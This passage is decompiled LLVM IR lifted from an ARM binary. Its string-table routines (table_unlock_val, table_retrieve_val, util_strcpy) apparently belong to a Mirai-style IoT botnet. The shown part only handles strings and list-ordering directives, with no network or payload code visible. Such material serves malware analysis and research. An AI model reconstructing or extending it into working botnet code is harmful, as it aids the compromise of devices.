  %v1_a450 = inttoptr i32 %v2_a44c to i8*
  %v2_a450 = call i32 @util_strlen(i8* %v1_a450)
  store i32 %v2_a450, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_a454 = icmp eq i32 %v2_a450, 0
  store i1 %v2_a454, i1* %cpsr_z.global-to-local, align 1
  %tmp216 = icmp slt i32 %v2_a450, 1
  br i1 %tmp216, label %dec_label_pc_a024, label %dec_label_pc_a45c

dec_label_pc_a45c:                                ; preds = %dec_label_pc_a430
  store i32 %v10_89fc, i32* %r2.global-to-local, align 4
  %v3_a460 = load i32, i32* %stack_var_-44, align 4
  %v0_a464 = load i32, i32* @r4, align 4
  store i32 %v0_a464, i32* @r0, align 4
  %v0_a468 = load i32, i32* @r5, align 4
  %v2_a468 = add i32 %v0_a468, %v3_a460
  store i32 %v2_a468, i32* %r1.global-to-local, align 4
  %v2_a46c = inttoptr i32 %v0_a464 to i8*
  %v3_a46c = call i32 @util_strcpy(i8* %v2_a46c, i32 %v2_a468)
  store i32 %v3_a46c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a024

dec_label_pc_a474:                                ; preds = %dec_label_pc_a3d0, %bb214
  %v2_a478 = phi i32 [ %v1_a3c0, %bb214 ], [ %v2_a3e4, %dec_label_pc_a3d0 ]
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_a478 = inttoptr i32 %v2_a478 to i8*
  store i8 0, i8* %v3_a478, align 1
  br label %dec_label_pc_a3f4

dec_label_pc_a480:                                ; preds = %dec_label_pc_9fa4
  %v1_a480 = add i32 %v0_a480, 1
  store i32 %v1_a480, i32* %ip.global-to-local, align 4
  %v2_a484 = add i32 %v0_9fa4, %v1_a480
  store i32 %v2_a484, i32* %r4.global-to-local, align 4
  store i32 %v10_89fc, i32* @lr, align 4
  store i32 %v2_a484, i32* %r0.global-to-local, align 4
  store i32 %v1_a480, i32* %stack_var_-44, align 4
  %v1_a494 = inttoptr i32 %v2_a484 to i8*
  %v2_a494 = call i32 @util_strlen(i8* %v1_a494)
  store i32 %v2_a494, i32* %r0.global-to-local, align 4
  %v0_a498 = load i32, i32* %r4.global-to-local, align 4
  %v2_a498 = add i32 %v0_a498, %v2_a494
  %v1_a49c = add i32 %v2_a498, -1
  %v2_a49c = inttoptr i32 %v1_a49c to i8*
  %v3_a49c = load i8, i8* %v2_a49c, align 1
  %v4_a49c = zext i8 %v3_a49c to i32
  store i32 %v4_a49c, i32* %r3.global-to-local, align 4
  %v2_a4a0 = icmp ugt i8 %v3_a49c, 33
  store i1 %v2_a4a0, i1* %cpsr_c.global-to-local, align 1
  %v7_a4a0 = icmp eq i8 %v3_a49c, 34
  store i1 %v7_a4a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a4a0, label %dec_label_pc_a4a8, label %dec_label_pc_9fb0

dec_label_pc_a4a8:                                ; preds = %dec_label_pc_a480
  store i32 %v10_89fc, i32* %r1.global-to-local, align 4
  %v3_a4ac = load i32, i32* %stack_var_-44, align 4
  %v0_a4b0 = load i32, i32* @r5, align 4
  %v2_a4b0 = add i32 %v0_a4b0, %v3_a4ac
  store i32 %v2_a4b0, i32* %r4.global-to-local, align 4
  store i32 %v2_a4b0, i32* %r0.global-to-local, align 4
  %v1_a4b8 = inttoptr i32 %v2_a4b0 to i8*
  %v2_a4b8 = call i32 @util_strlen(i8* %v1_a4b8)
  store i32 %v2_a4b8, i32* %r0.global-to-local, align 4
  %v2_a4bc = add i32 %v2_a4b0, %v2_a4b8
  %v0_a4c0 = load i32, i32* @r6, align 4
  %v1_a4c0 = trunc i32 %v0_a4c0 to i8
  %v3_a4c0 = add i32 %v2_a4bc, -1
  %v4_a4c0 = inttoptr i32 %v3_a4c0 to i8*
  store i8 %v1_a4c0, i8* %v4_a4c0, align 1
  br label %dec_label_pc_9fb0

dec_label_pc_a4c8:                                ; preds = %dec_label_pc_a018
  store i32 %v10_89fc, i32* %r3.global-to-local, align 4
  %v3_a4cc = load i32, i32* %stack_var_-44, align 4
  %v0_a4d0 = load i32, i32* @r6, align 4
  %v1_a4d0 = add i32 %v0_a4d0, 1
  store i32 %v1_a4d0, i32* @r5, align 4
  %v2_a4d4 = add i32 %v1_a4d0, %v3_a4cc
  store i32 %v2_a4d4, i32* %r0.global-to-local, align 4
  %v1_a4d8 = inttoptr i32 %v2_a4d4 to i8*
  %v2_a4d8 = call i32 @util_strlen(i8* %v1_a4d8)
  store i32 %v2_a4d8, i32* %r0.global-to-local, align 4
  %v2_a4dc = icmp ugt i32 %v2_a4d8, 254
  store i1 %v2_a4dc, i1* %cpsr_c.global-to-local, align 1
  %v7_a4dc = icmp eq i32 %v2_a4d8, 255
  store i1 %v7_a4dc, i1* %cpsr_z.global-to-local, align 1
  %v8_a4e0 = icmp sgt i32 %v2_a4d8, 255
  br i1 %v8_a4e0, label %dec_label_pc_a024, label %dec_label_pc_a4e4

dec_label_pc_a4e4:                                ; preds = %dec_label_pc_a4c8
  %v0_a4e4 = load i32, i32* %sb.global-to-local, align 4
  %v1_a4e8 = add i32 %v0_a4e4, 533
  store i32 %v1_a4e8, i32* @r4, align 4
  store i32 %v1_a4e8, i32* %r0.global-to-local, align 4
  store i32 255, i32* %r1.global-to-local, align 4
  %v2_a4f4 = call i32 @util_zero(i32 %v1_a4e8, i32 255)
  store i32 %v10_89fc, i32* @ip, align 4
  %v3_a4fc = load i32, i32* %stack_var_-44, align 4
  %v0_a500 = load i32, i32* @r5, align 4
  %v2_a500 = add i32 %v0_a500, %v3_a4fc
  store i32 %v2_a500, i32* %r0.global-to-local, align 4
  %v1_a504 = inttoptr i32 %v2_a500 to i8*
  %v2_a504 = call i32 @util_strlen(i8* %v1_a504)
  store i32 %v2_a504, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_a508 = icmp eq i32 %v2_a504, 0
  store i1 %v2_a508, i1* %cpsr_z.global-to-local, align 1
  %tmp217 = icmp slt i32 %v2_a504, 1
  br i1 %tmp217, label %dec_label_pc_a024, label %dec_label_pc_a510

dec_label_pc_a510:                                ; preds = %dec_label_pc_a4e4
  store i32 %v10_89fc, i32* @lr, align 4
  %v3_a514 = load i32, i32* %stack_var_-44, align 4
  %v0_a518 = load i32, i32* @r4, align 4
  store i32 %v0_a518, i32* @r0, align 4
  %v0_a51c = load i32, i32* @r5, align 4
  %v2_a51c = add i32 %v0_a51c, %v3_a514
  store i32 %v2_a51c, i32* %r1.global-to-local, align 4
  %v2_a520 = inttoptr i32 %v0_a518 to i8*
  %v3_a520 = call i32 @util_strcpy(i8* %v2_a520, i32 %v2_a51c)
  store i32 %v3_a520, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a024

dec_label_pc_a528:                                ; preds = %dec_label_pc_8bcc
  store i32 57, i32* %r0.global-to-local, align 4
  %v1_a52c = call i32 @table_unlock_val(i32 57)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 57, i32* %r0.global-to-local, align 4
  %v3_a538 = call i32 @table_retrieve_val(i32 57, i32* null)
  store i32 %v3_a538, i32* %r1.global-to-local, align 4
  %v0_a540 = load i32, i32* @r5, align 4
  %v1_a540 = add i32 %v0_a540, 20
  store i32 %v1_a540, i32* @r0, align 4
  %v2_a544 = inttoptr i32 %v1_a540 to i8*
  %v3_a544 = call i32 @util_strcpy(i8* %v2_a544, i32 %v3_a538)
  store i32 57, i32* %r0.global-to-local, align 4
  %v1_a54c = call i32 @table_lock_val(i32 57)
  store i32 %v1_a54c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a550

dec_label_pc_a550:                                ; preds = %dec_label_pc_8bcc, %dec_label_pc_a640, %dec_label_pc_a614, %dec_label_pc_a5e8, %dec_label_pc_a5a8, %dec_label_pc_a528
  store i32 %v0_8b18, i32* @r0, align 4
  %v0_a554 = load i32, i32* @r8, align 4
  store i32 %v0_a554, i32* %r1.global-to-local, align 4
  %v2_a558 = inttoptr i32 %v0_8b18 to i8*
  %v3_a558 = call i32 @util_strcpy(i8* %v2_a558, i32 %v0_a554)
  store i32 %v3_a558, i32* %r0.global-to-local, align 4
  store i32 %v0_8aa8, i32* %r2.global-to-local, align 4
  %v0_a560 = load i32, i32* %fp.global-to-local, align 4
  %v1_a560 = add i32 %v0_a560, 1
  store i32 %v1_a560, i32* %fp.global-to-local, align 4
  %v0_a564 = load i32, i32* @r5, align 4
  %v3_a568 = icmp uge i32 %v1_a560, %v0_8aa8
  store i1 %v3_a568, i1* %cpsr_c.global-to-local, align 1
  %v9_a568 = icmp eq i32 %v1_a560, %v0_8aa8
  store i1 %v9_a568, i1* %cpsr_z.global-to-local, align 1
  %v1_a56c = add i32 %v0_a564, 3140
  store i32 %v1_a56c, i32* @r5, align 4
  br i1 %v9_a568, label %dec_label_pc_a574, label %dec_label_pc_8ad8

dec_label_pc_a574:                                ; preds = %dec_label_pc_a550
  %v0_a584 = load i32, i32* @r7, align 4
  %v1_a584 = and i32 %v0_a584, 128
  %v2_a584 = icmp ne i32 %v1_a584, 0
  store i1 %v2_a584, i1* %cpsr_c.global-to-local, align 1
  %v3_a584 = udiv i32 %v0_a584, 256
  %v1_a588 = add i32 %v2_8abc, 1452
  store i32 %v1_a588, i32* %r3.global-to-local, align 4
  %v2_a58c = ptrtoint i32* %stack_var_-10572 to i32
  store i32 %v2_a58c, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_8c38.preheader

dec_label_pc_a5a8:                                ; preds = %dec_label_pc_8bcc
  store i32 58, i32* %r0.global-to-local, align 4
  %v1_a5ac = call i32 @table_unlock_val(i32 58)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 58, i32* %r0.global-to-local, align 4
  %v3_a5b8 = call i32 @table_retrieve_val(i32 58, i32* null)
  store i32 %v3_a5b8, i32* %r1.global-to-local, align 4
  %v0_a5c0 = load i32, i32* @r5, align 4
  %v1_a5c0 = add i32 %v0_a5c0, 20
  store i32 %v1_a5c0, i32* @r0, align 4
  %v2_a5c4 = inttoptr i32 %v1_a5c0 to i8*
  %v3_a5c4 = call i32 @util_strcpy(i8* %v2_a5c4, i32 %v3_a5b8)
  store i32 58, i32* %r0.global-to-local, align 4
  %v1_a5cc = call i32 @table_lock_val(i32 58)
  store i32 %v1_a5cc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a550

dec_label_pc_a5d4:                                ; preds = %dec_label_pc_a404
  %v0_a5d4 = load i32, i32* %sb.global-to-local, align 4
  %v0_a5d8 = load i32, i32* @r6, align 4
  store i32 %v0_a5d8, i32* %r1.global-to-local, align 4
  %v1_a5dc = add i32 %v0_a5d4, 789
  store i32 %v1_a5dc, i32* @r0, align 4
  %v2_a5e0 = inttoptr i32 %v1_a5dc to i8*
  %v3_a5e0 = call i32 @util_strcpy(i8* %v2_a5e0, i32 %v0_a5d8)
  store i32 %v3_a5e0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a414

dec_label_pc_a5e8:                                ; preds = %dec_label_pc_8bcc
  store i32 55, i32* %r0.global-to-local, align 4
  %v1_a5ec = call i32 @table_unlock_val(i32 55)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 55, i32* %r0.global-to-local, align 4
  %v3_a5f8 = call i32 @table_retrieve_val(i32 55, i32* null)
  store i32 %v3_a5f8, i32* %r1.global-to-local, align 4
  %v0_a600 = load i32, i32* @r5, align 4
  %v1_a600 = add i32 %v0_a600, 20
  store i32 %v1_a600, i32* @r0, align 4
  %v2_a604 = inttoptr i32 %v1_a600 to i8*
  %v3_a604 = call i32 @util_strcpy(i8* %v2_a604, i32 %v3_a5f8)
  store i32 55, i32* %r0.global-to-local, align 4
  %v1_a60c = call i32 @table_lock_val(i32 55)
  store i32 %v1_a60c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a550

dec_label_pc_a614:                                ; preds = %dec_label_pc_8bcc
  store i32 54, i32* %r0.global-to-local, align 4
  %v1_a618 = call i32 @table_unlock_val(i32 54)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 54, i32* %r0.global-to-local, align 4
  %v3_a624 = call i32 @table_retrieve_val(i32 54, i32* null)
  store i32 %v3_a624, i32* %r1.global-to-local, align 4
  %v0_a62c = load i32, i32* @r5, align 4
  %v1_a62c = add i32 %v0_a62c, 20
  store i32 %v1_a62c, i32* @r0, align 4
  %v2_a630 = inttoptr i32 %v1_a62c to i8*
  %v3_a630 = call i32 @util_strcpy(i8* %v2_a630, i32 %v3_a624)
  store i32 54, i32* %r0.global-to-local, align 4
  %v1_a638 = call i32 @table_lock_val(i32 54)
  store i32 %v1_a638, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a550

dec_label_pc_a640:                                ; preds = %dec_label_pc_8bcc
  store i32 56, i32* %r0.global-to-local, align 4
  %v1_a644 = call i32 @table_unlock_val(i32 56)
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 56, i32* %r0.global-to-local, align 4
  %v3_a650 = call i32 @table_retrieve_val(i32 56, i32* null)
  store i32 %v3_a650, i32* %r1.global-to-local, align 4
  %v0_a658 = load i32, i32* @r5, align 4
  %v1_a658 = add i32 %v0_a658, 20
  store i32 %v1_a658, i32* @r0, align 4
  %v2_a65c = inttoptr i32 %v1_a658 to i8*
  %v3_a65c = call i32 @util_strcpy(i8* %v2_a65c, i32 %v3_a650)
  store i32 56, i32* %r0.global-to-local, align 4
  %v1_a664 = call i32 @table_lock_val(i32 56)
  store i32 %v1_a664, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a550

; uselistorder directives
  uselistorder i32 %v2_a58c, { 1, 0 }
  uselistorder i32 %v1_a588, { 1, 0 }
  uselistorder i32 %v0_a584, { 0, 2, 1 }
  uselistorder i32 %v1_a56c, { 1, 0 }
  uselistorder i32 %v1_a480, { 1, 0, 2 }
  uselistorder i8 %v4_a3e4, { 2, 3, 1, 0 }
  uselistorder i32 %v1_a3d8, { 0, 2, 3, 1 }
  uselistorder i1 %v7_a3d0, { 1, 0 }
  uselistorder i32 %v1_a3c0, { 1, 0, 2 }
  uselistorder i1 %v7_a3bc, { 1, 0 }
  uselistorder i1 %v9_a3b4, { 1, 0 }
  uselistorder i32 %v0_a378, { 2, 1, 0, 3 }
  uselistorder i32 %v0_a2d8, { 1, 0 }
  uselistorder i32 %v2_a2b4, { 1, 0, 2 }
  uselistorder i32 %v1_a2ac, { 1, 0, 2 }
  uselistorder i32 %v1_a234, { 0, 2, 1 }
  uselistorder i32 %v0_a234, { 0, 2, 1 }
  uselistorder i32 %v2_a1a8, { 1, 2, 0, 5, 4, 3, 6 }
  uselistorder i8 %v4_a180, { 2, 3, 1, 0 }
  uselistorder i32 %v1_a174, { 1, 0, 3, 4, 2 }
  uselistorder i1 %v7_a16c, { 1, 0 }
  uselistorder i32 %v1_a15c, { 1, 0, 2 }
  uselistorder i1 %v7_a158, { 1, 0 }
  uselistorder i32 %v0_a118, { 2, 0, 1, 3 }
  uselistorder i32 %v3_a0dc, { 2, 0, 1, 3 }
  uselistorder i32 %v2_a0c0, { 1, 0, 2 }
  uselistorder i32 %v4_a0b8, { 2, 1, 0, 3 }
  uselistorder i32 %v0_9fe0, { 1, 0 }
  uselistorder i32 %v0_9fa4, { 1, 0 }
  uselistorder i32 %v0_a480, { 1, 0 }
  uselistorder i1 %v7_9f60, { 1, 0 }
  uselistorder i32 %v0_9f48, { 1, 0 }
  uselistorder i32 %v2_9f38, { 1, 0, 2 }
  uselistorder i32 %v1_9f04, { 1, 0 }
  uselistorder i32 %v0_9f04, { 1, 2, 0, 3 }
  uselistorder i1 %v7_9e9c, { 1, 0 }
  uselistorder i32 %v5_9e98, { 1, 2, 6, 4, 5, 3, 0, 7, 8 }
  uselistorder i32 %v2_9e80.v4_9e68, { 1, 0, 2 }
  uselistorder i1 %v7_9e44, { 1, 0 }
  uselistorder i32 %v1_9d24, { 1, 0, 2 }
  uselistorder i32 %v1_9d1c, { 1, 0 }
  uselistorder i1 %v7_9d04, { 1, 0 }
  uselistorder i32 %v5_9d00, { 1, 2, 5, 3, 4, 0, 6, 7 }
  uselistorder i32 %v2_9ce8.v4_9cd0, { 1, 0, 2 }
  uselistorder i1 %v7_9cb0, { 1, 0 }
  uselistorder i32 %v0_9c18, { 1, 0 }
  uselistorder i32 %v0_9c00, { 1, 0 }
  uselistorder i32 %v0_9c04, { 1, 0 }
  uselistorder i32 %v1_9bdc, { 2, 3, 1, 0, 4, 5, 6 }
  uselistorder i32 %v0_9ba8, { 1, 0 }
  uselistorder i1 %v7_9b70, { 0, 2, 1 }
  uselistorder i32 %v1_9b94, { 1, 0 }
  uselistorder i32 %v3_9b8c, { 0, 1, 3, 2, 4, 5, 6 }
  uselistorder i32 %v0_9b80, { 1, 0 }
  uselistorder i1 %v7_9af4, { 1, 0 }
  uselistorder i32 %v5_9af0, { 1, 5, 3, 4, 2, 0, 6, 7 }
  uselistorder i32 %v2_9ad8, { 1, 0, 2 }
  uselistorder i32 %v2_9ad4, { 1, 0, 2 }
  uselistorder i32 %v1_9ac0, { 0, 2, 1 }
  uselistorder i32 %v4_9ab8, { 1, 2, 0, 3 }
  uselistorder i1 %v7_9a88, { 1, 0 }
  uselistorder i1 %v7_9a20, { 1, 0 }
  uselistorder i32 %v5_9a1c, { 1, 2, 5, 3, 4, 0, 6, 7 }
  uselistorder i32 %v2_9a04.v4_99ec, { 1, 0, 2 }
  uselistorder i1 %v7_99bc, { 1, 0 }
  uselistorder i1 %v7_9948, { 1, 0 }
  uselistorder i32 %v5_9944, { 1, 2, 5, 3, 4, 0, 6, 7 }
  uselistorder i32 %v2_992c.v4_9914, { 1, 0, 2 }
  uselistorder i1 %v7_98f0, { 1, 0 }
  uselistorder i1 %v7_9870, { 1, 0 }
  uselistorder i32 %v5_986c, { 1, 2, 5, 3, 4, 0, 6, 7 }
  uselistorder i32 %v2_9854.v4_983c, { 1, 0, 2 }
  uselistorder i1 %v7_981c, { 1, 0 }
  uselistorder i1 %v7_97f0, { 1, 0 }
  uselistorder i1 %v7_97c8, { 1, 0 }
  uselistorder i32 %v0_9784, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v4_9754, { 2, 1, 0, 3, 4, 5 }
  uselistorder i32 %v2_96ec, { 1, 0 }
  uselistorder i32 %v2_96e0, { 1, 0 }
  uselistorder i32 %v1_96e0, { 2, 0, 1, 3 }
  uselistorder i32 %v1_96d4, { 1, 0 }
  uselistorder i32 %v3_96b8, { 5, 2, 3, 6, 4, 1, 0, 7 }
  uselistorder i32 %v2_9698, { 1, 0 }
  uselistorder i32 %v2_968c, { 1, 0 }
  uselistorder i32 %v1_968c, { 2, 0, 1, 3 }
  uselistorder i32 %v1_9680, { 1, 0 }
  uselistorder i32 %v3_9664, { 5, 2, 3, 6, 4, 1, 0, 7 }
  uselistorder i1 %v7_9620, { 1, 0 }
  uselistorder i32 %v5_95fc, { 1, 2, 3, 0 }
  uselistorder i1 %v7_95e4, { 1, 0 }
  uselistorder i32 %v3_95c8, { 1, 0 }
  uselistorder i32 %v0_9584, { 1, 0 }
  uselistorder i32 %v3_9550, { 4, 5, 6, 3, 1, 2, 0 }
  uselistorder i32* %v2_9550, { 1, 0 }
  uselistorder i32 %v0_9550, { 1, 0 }
  uselistorder i32 %v3_9538, { 1, 0, 2 }
  uselistorder i32 %v0_952c, { 1, 2, 0 }
  uselistorder i32 %storemerge49, { 1, 0 }
  uselistorder i1 %v7_94a8, { 1, 0 }
  uselistorder i32 %v4_949c, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_946c, { 1, 0 }
  uselistorder i32 %v2_945c, { 1, 0 }
  uselistorder i32 %v2_9450, { 1, 0 }
  uselistorder i32 %v1_9450, { 2, 0, 1, 3 }
  uselistorder i32 %v1_9444, { 1, 0 }
  uselistorder i32 %v3_9428, { 5, 2, 3, 6, 4, 1, 0, 7 }
  uselistorder i32 %v3_940c, { 0, 2, 1 }
  uselistorder i32 %v2_93e4, { 1, 0 }
  uselistorder i32 %v1_93e4, { 2, 0, 1, 3 }
  uselistorder i32 %v0_93e4, { 2, 4, 0, 1, 3, 5 }
  uselistorder i32 %v1_93d0, { 1, 0 }
  uselistorder i32 %v3_93b0, { 1, 0, 2 }
  uselistorder i32 %v1_9314, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_91b8, { 1, 0 }
  uselistorder i32 %v3_8f98, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v1_8f44, { 2, 1, 0, 3 }
  uselistorder i32 %v3_8f40, { 1, 0 }
  uselistorder i32 %v3_8f34, { 2, 0, 1 }
  uselistorder i1 %v7_8f20, { 1, 0 }
  uselistorder i32 %v3_8f18, { 3, 2, 1, 0, 4, 5 }
  uselistorder i1 %v7_8ef0, { 1, 0 }
  uselistorder i1 %v7_8ee8, { 1, 0 }
  uselistorder i32 %v3_8ecc, { 1, 0 }
  uselistorder i32 %v1_8eac, { 0, 1, 3, 2 }
  uselistorder i32 %v0_8eac, { 0, 2, 1 }
  uselistorder i32 %v2_8ea8, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8e94, { 1, 0, 2 }
  uselistorder i32 %v1_8e54, { 1, 0 }
  uselistorder i32 %v2_8e34, { 1, 0 }
  uselistorder i32 %v1_8e34, { 2, 0, 1, 3 }
  uselistorder i32 %v1_8e28, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i32 %v0_8e34, { 4, 1, 2, 5, 3, 0 }
  uselistorder i32 %v3_8e18, { 1, 0 }
  uselistorder i32 %v3_8e0c, { 1, 0, 2 }
  uselistorder i1 %v7_8d68, { 1, 0 }
  uselistorder i32 %v3_8d64, { 3, 2, 1, 0, 4, 5 }
  uselistorder i1 %v7_8d40, { 1, 0 }
  uselistorder i32 %v4_8d18, { 2, 1, 0 }
  uselistorder i8 %v3_8d18, { 11, 12, 13, 14, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i8* %v2_8d18, { 2, 0, 3, 1 }
  uselistorder i32 %v3_8fbc, { 4, 2, 3, 1, 0, 5 }
  uselistorder i1 %v7_8ce0, { 1, 0 }
  uselistorder i32 %v1_8ce0, { 1, 0 }
  uselistorder i1 %v7_8cd8, { 1, 0 }
  uselistorder i1 %v7_8cd0, { 1, 0 }
  uselistorder i1 %v7_8cc8, { 1, 0 }
  uselistorder i32 %v1_8cc8, { 1, 0 }
  uselistorder i1 %v7_8cc0, { 1, 0 }
  uselistorder i1 %v7_8cb8, { 1, 0 }
  uselistorder i32 %v1_8c9c, { 1, 0, 2, 4, 3 }
  uselistorder i32 %v2_8c3c, { 3, 2, 0, 4, 1, 5, 6 }
  uselistorder i8* %v1_8ffc, { 11, 10, 12, 8, 6, 7, 9, 0, 1, 2, 3, 4, 5, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26 }
  uselistorder i32 %v2_8e1c, { 0, 15, 1, 2, 3, 16, 4, 17, 5, 18, 6, 19, 7, 20, 8, 21, 22, 9, 23, 10, 13, 11, 14, 12, 24 }
  uselistorder i32 %v1_a590, { 1, 0, 2 }
  uselistorder i32 %stack_var_-20860.0.ph, { 58, 59, 57, 0, 61, 60, 1, 56, 55, 2, 64, 63, 3, 68, 67, 4, 66, 65, 5, 62, 6, 79, 78, 7, 77, 76, 8, 75, 74, 9, 73, 72, 10, 71, 11, 70, 69, 12, 54, 53, 13, 52, 51, 14, 50, 49, 15, 48, 47, 16, 46, 45, 17, 44, 43, 18, 42, 19, 41, 40, 20, 39, 38, 21, 37, 36, 22, 35, 34, 23, 33, 24, 32, 31, 25, 30, 29, 26, 27, 28 }
  uselistorder i32 %stack_var_-20864.0.ph, { 1, 0 }
  uselistorder i32 %v3_8c18, { 1, 0 }
  uselistorder i32 %v0_8c18, { 1, 0, 2 }
  uselistorder i32 %v2_8be4, { 1, 0, 2, 3 }
  uselistorder i32 %v3_8bd8, { 1, 0, 2 }
  uselistorder i32 %v0_8bcc, { 1, 0 }
  uselistorder i32 %v5_8bc4, { 1, 0 }
  uselistorder i32 %v0_8b90, { 1, 2, 0, 3 }
  uselistorder i32 %v0_8b18, { 5, 4, 1, 0, 3, 2 }
  uselistorder i32 %v0_8aec, { 1, 0 }
  uselistorder i32 %v2_8abc, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_8aa8, { 4, 5, 19, 15, 16, 17, 2, 3, 18, 0, 1, 14, 10, 11, 12, 13, 20, 8, 9, 7, 6 }
  uselistorder i32 %v0_8a9c, { 0, 1, 3, 2 }
  uselistorder i1 %v2_8a2c, { 1, 0, 2 }
  uselistorder i32* %v11_8a00, { 2, 0, 1, 3 }
  uselistorder i32 %v10_89fc, { 22, 21, 20, 12, 11, 18, 17, 16, 19, 15, 14, 33, 32, 31, 29, 28, 30, 27, 26, 13, 24, 23, 10, 9, 8, 25, 7, 39, 38, 37, 35, 36, 34, 44, 43, 42, 41, 40, 6, 5, 4, 3, 2, 1, 0, 45, 46 }
  uselistorder i32 %v2_89f4, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v2_89e4, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v2_89d4, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v0_89ac, { 1, 0, 2 }
  uselistorder i8* %tmp168, { 5, 6, 4, 7, 3, 8, 2, 9, 1, 10, 11, 12, 0 }
  uselistorder i32 %v2_8988, { 0, 29, 35, 36, 37, 38, 1, 32, 2, 3, 33, 34, 39, 17, 18, 4, 28, 5, 6, 30, 31, 40, 7, 26, 8, 27, 9, 41, 10, 11, 24, 25, 42, 12, 21, 13, 22, 23, 43, 14, 15, 19, 20, 44, 45, 46, 16, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56 }
  uselistorder i32 %v5_8980, { 1, 0 }
  uselistorder i32 %v6_8908, { 3, 2, 4, 0, 8, 7, 6, 1, 5, 9 }
  uselistorder i32* %stack_var_-44, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 0, 35, 36, 37, 38, 39, 42, 40, 41 }
  uselistorder i32* %sb.global-to-local, { 27, 28, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 10, 25, 26, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 29, 30 }
  uselistorder i32* %r4.global-to-local, { 9, 10, 11, 4, 1, 2, 3, 5, 6, 7, 8, 0 }
  uselistorder i32* %r3.global-to-local, { 156, 157, 158, 159, 4, 5, 6, 7, 8, 1, 9, 10, 12, 11, 13, 14, 15, 16, 17, 18, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 63, 146, 147, 149, 150, 151, 153, 152, 154, 155, 19, 20, 21, 148, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 94, 95, 91, 92, 93, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 107, 106, 3, 109, 110, 108, 2, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 0 }
  uselistorder i32* %r2.global-to-local, { 124, 125, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 17, 18, 20, 19, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 74, 75, 73, 76, 77, 79, 78, 80, 81, 82, 83, 84, 85, 2, 86, 87, 1, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 5, 6, 7, 157, 8, 9, 158, 150, 18, 159, 160, 161, 162, 163, 164, 10, 11, 12, 13, 14, 15, 16, 17, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 141, 142, 143, 144, 145, 146, 147, 148, 149, 151, 152, 153, 154, 155, 156, 32, 35, 33, 34, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 50, 48, 49, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 112, 111, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 0, 130, 131, 132, 133, 134, 135, 136, 137, 138, 140, 139, 1 }
